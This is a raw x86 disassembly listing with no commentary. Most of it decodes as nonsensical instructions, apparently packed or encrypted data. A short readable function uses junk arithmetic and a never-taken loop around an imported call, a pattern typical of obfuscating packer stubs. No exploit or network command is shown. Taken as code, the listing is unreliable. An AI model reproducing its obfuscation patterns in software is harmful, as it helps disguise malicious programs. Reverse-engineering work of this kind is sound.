  411dff:	sbb    ebx,DWORD PTR [esi+0x45e7608c]
  411e05:	test   ch,dh
  411e07:	outs   dx,DWORD PTR ds:[esi]
  411e08:	outs   dx,DWORD PTR es:[esi]
  411e0a:	and    ebx,DWORD PTR [edx+edx*8+0x7d79e663]
  411e11:	test   al,0x7a
  411e13:	pushf  
  411e14:	xchg   ebx,eax
  411e15:	scas   al,BYTE PTR es:[edi]
  411e16:	inc    ebp
  411e17:	arpl   WORD PTR [edx],dx
  411e19:	loope  0x411dff
  411e1b:	push   edx
  411e1c:	ficomp WORD PTR [edi]
  411e1e:	mov    eax,0x214a41cf
  411e23:	out    dx,eax
  411e24:	jmp    0x2ab2:0x9071f111
  411e2b:	test   DWORD PTR [ecx-0x27965de4],ecx
  411e31:	loope  0x411e8e
  411e33:	icebp  
  411e34:	xchg   BYTE PTR [ebx+0x199ac6a5],ah
  411e3a:	imul   eax,esp,0x7c46c1fc
  411e40:	jo     0x411dfc
  411e42:	ins    DWORD PTR es:[edi],dx
  411e43:	jne    0x411dc6
  411e45:	in     al,0xb4
  411e47:	int3   
  411e48:	cdq    
  411e49:	and    DWORD PTR [eax],esi
  411e4b:	or     ah,al
  411e4d:	rcr    BYTE PTR [eax+0x4f],1
  411e50:	xchg   ebx,eax
  411e51:	push   esi
  411e52:	gs cmp ch,dl
  411e55:	jge    0x411ec3
  411e57:	dec    edi
  411e58:	ins    BYTE PTR es:[edi],dx
  411e59:	repnz mov ecx,0xd37c772d
  411e5f:	ficomp DWORD PTR [ebx-0x36]
  411e62:	loop   0x411e57
  411e64:	(bad)  
  411e65:	fidiv  DWORD PTR [ecx]
  411e67:	loope  0x411ea1
  411e69:	frstor [edx]
  411e6b:	push   ebp
  411e6c:	add    al,0xa2
  411e6e:	mov    WORD PTR [edi+0x2ac59caa],?
  411e74:	(bad)  
  411e75:	sub    ah,ah
  411e77:	inc    edi
  411e78:	mov    ch,0x24
  411e7a:	jl     0x411e32
  411e7c:	jl     0x411e6a
  411e7e:	retf   
  411e7f:	xor    al,0x7a
  411e81:	add    eax,0x39bc9c92
  411e86:	retf   0xf671
  411e89:	daa    
  411e8a:	sbb    ch,bl
  411e8c:	call   0x10896017
  411e91:	xchg   edx,eax
  411e92:	cs (bad) 
  411e94:	push   ss
  411e95:	push   ecx
  411e96:	(bad)  
  411e97:	jno    0x411e33
  411e99:	leave  
  411e9a:	or     al,0x1a
  411e9c:	sbb    eax,0xd462198d
  411ea1:	mov    esi,0x6655658d
  411ea6:	adc    BYTE PTR [esi+0x5e],cl
  411ea9:	add    dh,al
  411eab:	xor    esp,DWORD PTR [ecx+esi*2]
  411eae:	loope  0x411e97
  411eb0:	lods   eax,DWORD PTR ds:[esi]
  411eb1:	daa    
  411eb2:	mov    dh,0x84
  411eb4:	repnz out 0x1a,eax
  411eb7:	into   
  411eb8:	das    
  411eb9:	xchg   esp,ebp
  411ebb:	loope  0x411e6e
  411ebd:	xor    al,0xde
  411ebf:	rcl    DWORD PTR [eax],cl
  411ec1:	inc    esp
  411ec2:	repz pop eax
  411ec4:	gs clc 
  411ec6:	imul   eax,esp,0x65
  411ec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411eca:	inc    ecx
  411ecb:	adc    edx,ebx
  411ecd:	push   esp
  411ece:	scas   al,BYTE PTR es:[edi]
  411ecf:	call   0x42f2b174
  411ed4:	mov    ah,0x77
  411ed6:	(bad)
  411eda:	dec    edx
  411edb:	neg    BYTE PTR [ebp-0x66]
  411ede:	and    esi,DWORD PTR [ebx]
  411ee0:	pop    esp
  411ee1:	cmp    ebx,DWORD PTR [ebp+ecx*2-0x2b]
  411ee5:	pop    ebx
  411ee6:	enter  0x8069,0x9d
  411eea:	mov    al,0xbb
  411eec:	and    al,bh
  411eee:	sub    DWORD PTR [ebp+eiz*8-0x4f],esp
  411ef2:	pop    es
  411ef3:	ins    BYTE PTR es:[edi],dx
  411ef4:	test   eax,0xa5a05b7a
  411ef9:	enter  0x7c56,0xda
  411efd:	jb     0x411e94
  411eff:	mov    ebx,DWORD PTR [eax-0x31]
  411f02:	sbb    edx,DWORD PTR [esi-0x8]
  411f05:	xor    ebp,DWORD PTR [esp+ecx*8+0x41]
  411f09:	jmp    0xfdfb:0xe056483f
  411f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f11:	push   0xd0f1c1bc
  411f16:	call   DWORD PTR [eax+0x6be91e48]
  411f1c:	lods   al,BYTE PTR ds:[esi]
  411f1d:	jne    0x411ee1
  411f1f:	jns    0x411f75
  411f21:	pop    edx
  411f22:	scas   eax,DWORD PTR es:[edi]
  411f23:	(bad)  
  411f24:	inc    DWORD PTR [eax-0x691a25ee]
  411f2a:	jecxz  0x411f0a
  411f2c:	std    
  411f2d:	pop    ebx
  411f2e:	push   0xc2039b63
  411f33:	cmp    eax,0x5e9799a5
  411f38:	aaa    
  411f39:	xor    BYTE PTR [ebx-0x49],0xc4
  411f3d:	pop    edi
  411f3e:	call   0x24b:0x850f786
  411f45:	xor    al,0x7e
  411f47:	add    ch,0x96
  411f4a:	jo     0x411f17
  411f4c:	sub    dh,BYTE PTR [ebp-0x7b]
  411f4f:	sbb    dh,BYTE PTR [ebx+ebx*8]
  411f52:	sub    esi,DWORD PTR [ecx+0x51]
  411f55:	fcmovnu st,st(3)
  411f57:	or     edi,DWORD PTR [edx-0x72]
  411f5a:	leave  
  411f5b:	sub    al,0x1b
  411f5d:	pop    edi
  411f5e:	ret    
  411f5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f60:	cmc    
  411f61:	jns    0x411f26
  411f63:	in     eax,dx
  411f64:	xor    al,0x1c
  411f67:	xchg   eax,ecx
  411f69:	ficomp DWORD PTR [esp+eax*1+0x6fa56ea]
  411f70:	pop    esp
  411f71:	mov    edi,0x85df511d
  411f76:	sub    eax,0x4ca79dc9
  411f7b:	int3   
  411f7c:	pushf  
  411f7d:	pushf  
  411f7e:	or     DWORD PTR [ecx],edi
  411f80:	out    dx,eax
  411f81:	xchg   esp,eax
  411f82:	(bad)  
  411f83:	jne    0x411f9d
  411f85:	scas   al,BYTE PTR es:[edi]
  411f86:	pop    ebp
  411f87:	xchg   esi,eax
  411f88:	cwde   
  411f89:	inc    eax
  411f8a:	clc    
  411f8b:	pop    ss
  411f8c:	mov    ?,WORD PTR [ebx+0xb31aa5c]
  411f92:	lock adc eax,0xf01d2dd5
  411f98:	ins    DWORD PTR es:[edi],dx
  411f99:	pop    edi
  411f9a:	push   esi
  411f9b:	cld    
  411f9c:	les    edi,FWORD PTR [eax+esi*1+0x36]
  411fa0:	popf   
  411fa1:	sar    bh,cl
  411fa3:	mov    dh,0x3f
  411fa5:	xchg   bl,bh
  411fa7:	fistp  WORD PTR [eax+0x46]
  411faa:	and    eax,0x7b66bc3a
  411faf:	sbb    DWORD PTR ds:0xc816f7d6,ebp
  411fb5:	xchg   esp,eax
  411fb6:	outs   dx,DWORD PTR ds:[esi]
  411fb7:	inc    eax
  411fb8:	in     eax,dx
  411fb9:	fidiv  DWORD PTR [edi]
  411fbb:	mov    al,ds:0x2f6bc61a
  411fc0:	sbb    al,0x98
  411fc2:	xchg   edi,eax
  411fc3:	outs   dx,DWORD PTR ds:[esi]
  411fc4:	push   edx
  411fc5:	push   edi
  411fc6:	sub    ecx,DWORD PTR [edx-0x4b09943d]
  411fcc:	loopne 0x411f80
  411fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fcf:	inc    edi
  411fd0:	outs   dx,DWORD PTR ds:[esi]
  411fd1:	adc    esp,DWORD PTR [esi]
  411fd3:	adc    BYTE PTR [ebx+0x6f],0xf0
  411fd7:	or     BYTE PTR [esi+esi*4+0x517e3447],ah
  411fde:	xor    dl,ch
  411fe0:	test   DWORD PTR [esi+eiz*2+0x8],ebx
  411fe4:	das    
  411fe5:	js     0x411f81
  411fe7:	mov    al,0x5c
  411fe9:	stos   DWORD PTR es:[edi],eax
  411fea:	bnd jbe 0x411fcb
  411fed:	ror    edx,0x15
  411ff0:	ins    DWORD PTR es:[edi],dx
  411ff1:	mov    WORD PTR [edx],es
  411ff3:	int3   
  411ff4:	mov    ds:0x3c96beba,eax
  411ff9:	loopne 0x411fd6
  411ffb:	sub    DWORD PTR [esi-0x3ba74be6],esi
  412001:	xchg   ebp,eax
  412002:	out    0x14,al
  412004:	or     BYTE PTR [eax-0x79],bh
  412007:	jge    0x412072
  412009:	lds    esi,FWORD PTR [eax]
  41200b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41200c:	cli    
  41200d:	rol    edx,cl
  41200f:	inc    ebp
  412010:	data16 sbb ch,ah
  412013:	mov    ch,0xaf
  412015:	fld    TBYTE PTR [ebp+0x6233c3bb]
  41201b:	and    DWORD PTR [eax],esi
  41201d:	push   cs
  41201e:	or     eax,0x3bd4d13d
  412023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412024:	pushf  
  412025:	sub    esp,DWORD PTR [edi-0x4d]
  412028:	fdiv   st,st(0)
  41202a:	push   esp
  41202c:	mov    ds:0x55ff0d39,al
  412031:	popa   
  412032:	and    eax,0xe6b98289
  412037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412038:	dec    edx
  412039:	push   ss
  41203a:	and    BYTE PTR [ecx+0xdf1ba0b],ch
  412040:	sub    ebp,DWORD PTR [edi]
  412042:	aam    0x8c
  412044:	rcl    DWORD PTR [esi+0x9480a49],1
  41204a:	addr16 cli 
  41204c:	mov    ebx,0x489b5ada
  412051:	stc    
  412052:	push   eax
  412053:	add    eax,0x736ef20d
  412058:	inc    esp
  412059:	in     al,dx
  41205a:	ins    DWORD PTR es:[edi],dx
  41205b:	gs push ebp
  41205d:	dec    ebp
  41205e:	(bad)  
  41205f:	mov    edi,0x49ff2ee4
  412064:	div    BYTE PTR [esi]
  412066:	sbb    al,0xd3
  412068:	jecxz  0x412068
  41206a:	imul   DWORD PTR [edi]
  41206c:	push   0xffffff9f
  41206e:	inc    ebx
  41206f:	add    esi,eax
  412071:	xor    eax,0xdf95dd62
  412076:	push   ebp
  412077:	aam    0x92
  412079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41207a:	sub    ebx,DWORD PTR [eax]
  41207c:	les    eax,FWORD PTR [ecx+0x5f87a1ee]
  412082:	scas   eax,DWORD PTR es:[edi]
  412083:	in     eax,0xe7
  412085:	cmp    al,0xcc
  412087:	stos   BYTE PTR es:[edi],al
  412088:	pop    ebp
  412089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41208a:	scas   al,BYTE PTR es:[edi]
  41208b:	mov    eax,0x3317a638
  412090:	lds    ebx,FWORD PTR [ebp+0x64]
  412093:	inc    edx
  412094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412095:	add    eax,0x99898fa2
  41209a:	into   
  41209b:	push   cs
  41209c:	inc    ebp
  41209d:	inc    edi
  41209e:	adc    eax,0x30af6512
  4120a3:	mov    esi,0xc33d8e33
  4120a8:	pop    ebp
  4120a9:	mov    eax,DWORD PTR [ebp+0x8]
  4120ac:	mov    eax,DWORD PTR [eax]
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fd76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fcd5
  4120d3:	adc    DWORD PTR ds:0x42e6ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e6eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e703,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e6fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e6fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e6fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fd7e
  412121:	push   0x0
  412123:	push   0x42e26d
  412128:	call   DWORD PTR ds:0x42e483
  41212e:	mov    ebx,DWORD PTR ds:0x42e6fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e6fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e120,0x42fd01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	push   0x46d3b0f6
  412172:	pop    edi
  412173:	jo     0x4121e5
  412175:	mov    ecx,0xdd70707e
  41217a:	sbb    eax,0xd7804394
  41217f:	fs mov esi,0x1904a0c6
  412185:	aad    0xac
  412187:	adc    esi,esp
  412189:	stos   BYTE PTR es:[edi],al
  41218a:	out    0xb2,al
  41218c:	adc    bh,al
  41218e:	(bad)  
  41218f:	mov    eax,ds:0x6a71d3b0
  412194:	sub    al,0x37
  412196:	aas    
  412197:	push   ecx
  412198:	mov    ecx,0xf986acda
  41219d:	or     eax,0x9df271a6
  4121a2:	dec    edx
  4121a3:	inc    ebp
  4121a4:	push   ecx
  4121a5:	fs ja  0x41215d
  4121a8:	add    eax,0xaf49e8ed
  4121ad:	xor    al,0xc0
  4121af:	push   eax
  4121b0:	outs   dx,BYTE PTR ds:[esi]
  4121b1:	lods   eax,DWORD PTR ds:[esi]
  4121b2:	cwde   
  4121b3:	mov    DWORD PTR [ebp-0x57],edi
  4121b6:	sub    eax,0x2e2dd530
  4121bb:	stc    
  4121bc:	popf   
  4121bd:	jg     0x412209
  4121bf:	lds    eax,FWORD PTR [edx+0x2b]
  4121c2:	or     ebp,DWORD PTR [edx-0x3d]
  4121c5:	ds mov ah,0xcd
  4121c8:	jne    0x41214d
  4121ca:	xor    eax,0x4d9eb2fe
  4121cf:	sub    ebp,DWORD PTR [eax]
  4121d1:	mov    edx,0xae9609f5
  4121d6:	ret    
  4121d7:	bnd ret 0x32bc
  4121db:	lock js 0x412172
  4121de:	sahf   
  4121df:	xchg   ah,dh
  4121e1:	xor    BYTE PTR [edi+0x3a0ba519],dh
  4121e7:	(bad)  
  4121e8:	fisttp WORD PTR [edx-0x51]
  4121eb:	sbb    al,0x53
  4121ed:	aam    0x5e
  4121ef:	jmp    0x7006:0xe9eb4222
  4121f6:	jl     0x41217e
  4121f8:	mov    dh,0xaa
  4121fa:	(bad)  
  4121fb:	push   esi
  4121fc:	xchg   ebp,eax
  4121fd:	scas   eax,DWORD PTR es:[edi]
  4121fe:	jp     0x412204
  412200:	xor    eax,0xad5dab13
  412205:	rcl    ebx,0x1e
  412208:	inc    eax
  412209:	adc    al,0xa5
  41220b:	or     dl,bh
  41220d:	fistp  WORD PTR ds:0x95144319
  412213:	out    0xb8,al
  412215:	fs dec ecx
  412217:	push   0xe35d2cb1
  41221c:	push   edi
  41221d:	sub    al,0xe4
  41221f:	cmp    eax,0xd4088428
  412224:	dec    ebx
  412225:	div    DWORD PTR [ecx+0x5308b624]
  41222b:	enter  0x8034,0x7a
  41222f:	retf   
  412230:	in     al,dx
  412231:	sbb    BYTE PTR [esp+eax*4],ah
  412234:	jbe    0x41225a
  412236:	and    bl,bl
  412238:	jns    0x41224c
  41223a:	jno    0x4122a8
  41223c:	push   ecx
  41223d:	icebp  
  41223e:	ins    DWORD PTR es:[edi],dx
  41223f:	(bad)  
  412240:	scas   al,BYTE PTR es:[edi]
  412241:	or     DWORD PTR [ebp+0xf],0x35
  412245:	int3   
  412246:	sub    eax,0xa65a458f
  41224b:	inc    esp
  41224c:	or     bh,dl
  41224e:	adc    eax,0x2351c6f
  412253:	les    eax,FWORD PTR [esi+0x594d8f37]
  412259:	inc    eax
  41225a:	inc    ecx
  41225b:	jecxz  0x4122ae
  41225d:	clc    
  41225e:	mov    bh,0xc1
  412260:	mov    esi,0x2ef0de7d
  412265:	push   edi
  412266:	sysenter 
  412268:	das    
  412269:	gs in  al,dx
  41226b:	jge    0x41228d
  41226d:	or     esp,edx
  41226f:	ret    
  412270:	repnz pusha 
  412272:	cld    
  412273:	mov    al,ds:0x6d86ebe1
  412278:	sbb    esp,DWORD PTR [ecx-0x157a79a8]
  41227e:	jo     0x412207
  412280:	ret    0x8fff
  412283:	ror    DWORD PTR [ebp-0x78344404],cl
  412289:	fs sub edi,edi
  41228c:	mov    WORD PTR [eax+0x6d],?
  41228f:	ss enter 0x601e,0x8a
  412294:	pop    edi
  412295:	xchg   BYTE PTR [edx],al
  412297:	in     eax,0x59
  412299:	jo     0x4122ee
  41229b:	mov    al,ds:0x4efddcc5
  4122a0:	or     bh,BYTE PTR [ecx]
  4122a2:	data16 jb 0x412294
  4122a5:	push   ecx
  4122a6:	mov    esi,0xf4802d6
  4122ab:	ss (bad) 
  4122ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122ae:	or     dl,0x9d
  4122b1:	dec    edi
  4122b2:	inc    edx
  4122b3:	ja     0x412298
  4122b5:	xor    al,0xd8
  4122b7:	imul   esp,DWORD PTR [ebx],0x7b23f7fb
  4122bd:	xor    ebp,DWORD PTR [edi]
  4122bf:	xchg   DWORD PTR [ebp+0x36df49c2],ecx
  4122c5:	sbb    DWORD PTR [edx+0x56695ecf],eax
  4122cb:	scas   eax,DWORD PTR es:[edi]
  4122cc:	mov    esp,0x8178f3b7
  4122d1:	call   0x6d64:0x812921a8
  4122d8:	xchg   ebp,eax
  4122d9:	popf   
  4122da:	mul    esi
  4122dc:	cmp    BYTE PTR [ecx+ebp*1+0x7],dh
  4122e0:	das    
  4122e1:	lock add al,0xc7
  4122e4:	push   ecx
  4122e5:	gs mov dh,0x4a
  4122e8:	sbb    dh,BYTE PTR [ecx]
  4122ea:	sub    DWORD PTR [ecx+eax*8-0x55],0x10
  4122ef:	jp     0x4122cd
  4122f1:	jle    0x4122dc
  4122f3:	scas   eax,DWORD PTR es:[edi]
  4122f4:	out    0xb2,eax
  4122f6:	lods   al,BYTE PTR ds:[esi]
  4122f7:	nop
  4122f8:	(bad)  [ebx]
  4122fa:	jl     0x41230f
  4122fc:	inc    edx
  4122fd:	jmp    0x4122c8
  4122ff:	sbb    al,0x80
  412301:	dec    ecx
  412302:	push   es
  412303:	(bad)  
  412304:	imul   ebx,eax,0x12d96a2a
  41230a:	stos   BYTE PTR es:[edi],al
  41230b:	pop    eax
  41230c:	ins    BYTE PTR es:[edi],dx
  41230d:	shl    DWORD PTR [ebp+0x6],1
  412310:	in     al,dx
  412311:	je     0x412372
  412313:	push   es
  412314:	call   0xfad7a4c9
  412319:	mov    es,WORD PTR [esi+0x7aa6320f]
  41231f:	nop
  412320:	scas   eax,DWORD PTR es:[edi]
  412321:	xor    cl,bh
  412323:	out    dx,eax
  412324:	dec    esp
  412325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412326:	inc    edi
  412327:	cmp    ecx,ebp
  412329:	iret   
  41232a:	loopne 0x4123a6
  41232c:	mov    DWORD PTR [esi+0x1cd4720e],edi
  412332:	jmp    0x3e78f5cb
  412337:	pop    eax
  412338:	push   ss
  412339:	adc    eax,0x339c23b
  41233e:	mov    edx,0x3abd9ff6
  412343:	pop    eax
  412344:	pop    eax
  412345:	clc    
  412346:	fst    QWORD PTR [ecx]
  412348:	ret    0x9750
  41234b:	jns    0x412378
  41234d:	or     al,0x97
  41234f:	cmp    DWORD PTR [esi],edx
  412351:	push   ds
  412352:	sub    esp,ebp
  412354:	sub    ebp,edx
  412356:	pop    ds
  412357:	dec    ebp
  412358:	xchg   edi,eax
  412359:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41235a:	out    0xe1,al
  41235c:	pushf  
  41235d:	rcl    DWORD PTR [ebp+0x54bc757f],0x77
  412364:	jbe    0x4122e7
  412366:	aaa    
  412367:	jecxz  0x412345
  412369:	popf   
  41236a:	inc    ecx
  41236b:	jmp    0xd2fc:0x34cdfb17
  412372:	cld    
  412373:	push   0x5524ec9b
  412378:	sbb    al,bh
  41237a:	lahf   
  41237b:	mov    bh,BYTE PTR [ebp+edi*8-0x64]
  41237f:	push   ecx
  412380:	retf   0xe644
  412383:	xor    edx,DWORD PTR [edx-0x4e06c227]
  412389:	mov    ds:0xd641aff2,eax
  41238e:	int    0x69
  412390:	fdiv   QWORD PTR [eax]
  412392:	add    bl,BYTE PTR [esi]
  412394:	aaa    
  412395:	cmp    edi,DWORD PTR [eax]
  412397:	rcr    DWORD PTR [ebp+0x5e],cl
  41239a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41239b:	jae    0x412419
  41239d:	push   edx
  41239e:	aad    0xc5
  4123a0:	mov    bl,0x5d
  4123a2:	or     al,dl
  4123a4:	sub    eax,0xd1dfd930
  4123a9:	jp     0x41232f
  4123ab:	and    ebx,DWORD PTR [edi]
  4123ad:	clc    
  4123ae:	xor    al,0xd4
  4123b0:	mov    edx,0xc5de2c0
  4123b5:	test   BYTE PTR [edi],bh
  4123b7:	mov    edx,0x50c01b7b
  4123bc:	xchg   DWORD PTR [esi+0x79],ecx
  4123bf:	neg    BYTE PTR [ebx]
  4123c1:	cli    
  4123c2:	das    
  4123c3:	outs   dx,DWORD PTR ds:[esi]
  4123c4:	fadd   DWORD PTR [ecx]
  4123c6:	mov    ds:0x9aa40a0c,al
  4123cb:	jae    0x412398
  4123cd:	scas   eax,DWORD PTR es:[edi]
  4123ce:	mov    bh,0x60
  4123d0:	cmp    dh,ch
  4123d2:	fwait
  4123d3:	in     al,0xbe
  4123d5:	pop    ss
  4123d6:	dec    esp
  4123d7:	icebp  
  4123d8:	inc    ecx
  4123d9:	leave  
  4123da:	cdq    
  4123db:	inc    esi
  4123dc:	(bad)  
  4123dd:	xor    DWORD PTR [ebp+0x7d],edi
  4123e0:	(bad)  
  4123e2:	or     BYTE PTR [edx+edx*8-0x1d],al
  4123e6:	and    bh,ah
  4123e8:	xchg   ebp,eax
  4123e9:	fcomp  st(7)
  4123eb:	jo     0x41244b
  4123ed:	outs   dx,DWORD PTR ds:[esi]
  4123ee:	xchg   edi,eax
  4123ef:	mov    cl,0x28
  4123f1:	jns    0x412443
  4123f3:	xchg   ebp,eax
  4123f4:	(bad)  [eax+0x39]
  4123f7:	mov    fs,ecx
  4123f9:	popf   
  4123fa:	sti    
  4123fb:	std    
  4123fc:	jp     0x4123cd
  4123fe:	(bad)  
  4123ff:	and    BYTE PTR [ecx+0x6ed8587c],ah
  412405:	adc    al,0x7c
  412407:	(bad)  
  412408:	xor    ebp,DWORD PTR [esi+0x5]
  41240b:	cmp    eax,0x6c4be1c5
  412410:	cmp    DWORD PTR ds:0x19cc4d04,ebx
  412416:	fstp   QWORD PTR [esi-0x2664e28f]
  41241c:	stos   DWORD PTR es:[edi],eax
  41241d:	cli    
  41241e:	dec    ebx
  41241f:	push   esi
  412420:	adc    DWORD PTR [ecx-0x496be710],eax
  412426:	sbb    bl,BYTE PTR [ebx]
  412428:	loop   0x41244f
  41242a:	inc    eax
  41242b:	or     al,0xfb
  41242d:	jg     0x4123df
  41242f:	das    
  412430:	ficomp DWORD PTR [ebx]
  412432:	inc    eax
  412433:	or     edx,edx
  412435:	(bad)  [ebx+ecx*1-0x14]
  412439:	push   eax
  41243a:	mov    bl,0xa4
  41243c:	xor    al,0xa6
  41243e:	mov    esp,0x81cb0317
  412443:	sub    eax,0x42fcf9
  412448:	xchg   esi,eax
  412449:	sldt   WORD PTR [eax]
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	and    BYTE PTR [ecx-0x18],0x6a
  412461:	(bad)  
  412462:	pop    esp
  412463:	jo     0x4124d5
  412465:	mov    ecx,0xbd70707e
  41246a:	(bad)  
  41246b:	mov    edi,0xf64f51b1
  412470:	add    BYTE PTR [edi+eax*8-0x5d65dc83],dl
  412477:	mov    dh,0xdb
  412479:	dec    esi
  41247a:	int3   
  41247b:	xor    al,0x61
  41247d:	inc    esi
  41247e:	sar    DWORD PTR [edx+0x43],1
  412481:	xor    esp,DWORD PTR [ebx+0x408c9552]
  412487:	sub    edx,DWORD PTR [ebx-0x7a]
  41248a:	inc    eax
  41248b:	(bad)  
  41248c:	mov    bh,0xe5
  41248e:	adc    eax,esp
  412490:	pop    ds
  412491:	and    DWORD PTR [edi-0x56],edx
  412494:	js     0x4124fb
  412496:	fs dec esp
  412498:	fistp  WORD PTR [ebp-0x63]
  41249b:	data16 lahf 
  41249d:	in     eax,0x1b
  41249f:	pop    esp
  4124a0:	(bad)  
  4124a1:	xchg   ebp,eax
  4124a2:	xchg   ebp,eax
  4124a3:	and    DWORD PTR [esi+0x551bf401],esp
  4124a9:	rol    DWORD PTR [edi],cl
  4124ab:	push   esi
  4124ac:	jne    0x4124c8
  4124ae:	addr16 jmp 0x935e:0x4a2ee680
  4124b6:	aas    
  4124b7:	jp     0x412494
  4124b9:	push   0xffffffd4
  4124bb:	outs   dx,DWORD PTR ds:[esi]
  4124bc:	neg    DWORD PTR [edx-0x457a4a80]
  4124c2:	mov    al,0x1b
  4124c4:	pop    es
  4124c5:	jle    0x4124c5
  4124c7:	dec    DWORD PTR [edx]
  4124c9:	fist   WORD PTR [edi-0x35a01f86]
  4124cf:	pop    eax
  4124d0:	or     esi,DWORD PTR [ecx+0x6222805c]
  4124d6:	pop    ebp
  4124d7:	and    DWORD PTR [esi+eax*4],esp
  4124da:	sbb    BYTE PTR [ebp-0x79],bl
  4124dd:	or     esi,DWORD PTR [ecx-0x6c]
  4124e0:	test   bl,bh
  4124e2:	xchg   edx,eax
  4124e3:	call   0xbddae7ef
  4124e8:	xchg   DWORD PTR [edi+ebx*8-0x27204ec],ecx
  4124ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124f0:	(bad)  
  4124f2:	icebp  
  4124f3:	out    0x54,eax
  4124f5:	mov    ecx,0xcc690812
  4124fa:	inc    esi
  4124fb:	xchg   DWORD PTR [eax+0x5d525755],esp
  412501:	cdq    
  412502:	xor    BYTE PTR [edi+0x1f],dl
  412505:	dec    ebx
  412506:	xchg   edx,eax
  412507:	and    cl,BYTE PTR [ebx+0x35ba2912]
  41250d:	mov    bh,0x32
  41250f:	daa    
  412510:	stc    
  412511:	inc    ecx
  412512:	jo     0x41258f
  412514:	int    0x2
  412516:	push   0x59e56e56
  41251b:	mov    ds:0xa39f5f65,eax
  412520:	ret    0x4617
  412523:	arpl   WORD PTR [ebx],ax
  412525:	jmp    0xe644:0xa91dbddb
  41252c:	mov    eax,0xf207286
  412531:	(bad)  
  412533:	ins    BYTE PTR es:[edi],dx
  412534:	scas   eax,DWORD PTR es:[edi]
  412535:	jb     0x41253c
  412537:	pop    esp
  412538:	loope  0x41253f
  41253a:	cli    
  41253b:	push   cs
  41253c:	outs   dx,BYTE PTR ds:[esi]
  41253d:	sub    eax,0xfba8e11e
  412542:	fistp  DWORD PTR [ecx+0x76]
  412545:	inc    ecx
  412546:	mov    eax,0x8ede0575
  41254b:	das    
  41254c:	sub    DWORD PTR [ebp+0x29],ebp
  41254f:	mov    ch,0xab
  412551:	jge    0x412594
  412553:	sub    BYTE PTR [edx],0x73
  412556:	imul   esi,DWORD PTR [edx],0x94a5314a
  41255c:	in     eax,dx
  41255d:	jg     0x4125d5
  41255f:	xchg   DWORD PTR ds:[eax],ecx
  412562:	lds    ebx,FWORD PTR [eax-0x7326323a]
  412568:	fisttp QWORD PTR [ebx-0x270eed38]
  41256e:	jp     0x4125ef
  412570:	sbb    bl,BYTE PTR [edx+0x6e91c101]
  412576:	(bad)  
  412577:	daa    
  412578:	retf   0xd089
  41257b:	mov    ds:0x54867427,eax
  412580:	leave  
  412581:	rol    BYTE PTR [ebp+0x7c],cl
  412584:	imul   ecx,DWORD PTR ss:[esi+0x2c],0xf2d31e42
  41258c:	mov    ch,0xc9
  41258e:	lods   al,BYTE PTR ds:[esi]
  41258f:	push   eax
  412590:	mov    al,0xe8
  412592:	cdq    
  412593:	jge    0x412515
  412595:	xor    al,0xec
  412597:	mov    bl,0x6e
  412599:	into   
  41259a:	test   DWORD PTR [esi+0x5e78ec62],0x2fa34b96
  4125a4:	lods   eax,DWORD PTR ds:[esi]
  4125a5:	push   esi
  4125a6:	sar    DWORD PTR [edi],1
  4125a8:	std    
  4125a9:	cmp    ecx,ecx
  4125ab:	int3   
  4125ac:	adc    ch,BYTE PTR [edi]
  4125ae:	and    BYTE PTR [ebp+0x71],ch
  4125b1:	xchg   edx,eax
  4125b2:	lock sub DWORD PTR [ecx-0x22],edi
  4125b6:	mov    WORD PTR [edi],fs
  4125b8:	and    BYTE PTR [ecx+0x4a],dl
  4125bb:	mov    ds:0x4a4789cf,eax
  4125c0:	in     eax,0x63
  4125c2:	pop    ebp
  4125c3:	mov    ecx,0x3bd03ed6
  4125c8:	imul   edx,DWORD PTR [edi+0x77f81dd7],0xffffff8d
  4125cf:	popa   
  4125d0:	(bad)  
  4125d1:	ret    0x8259
  4125d4:	dec    edi
  4125d5:	fisubr DWORD PTR [edi+0x56]
  4125d8:	jne    0x412595
  4125da:	nop
  4125db:	xor    eax,0x527a319b
  4125e0:	push   esi
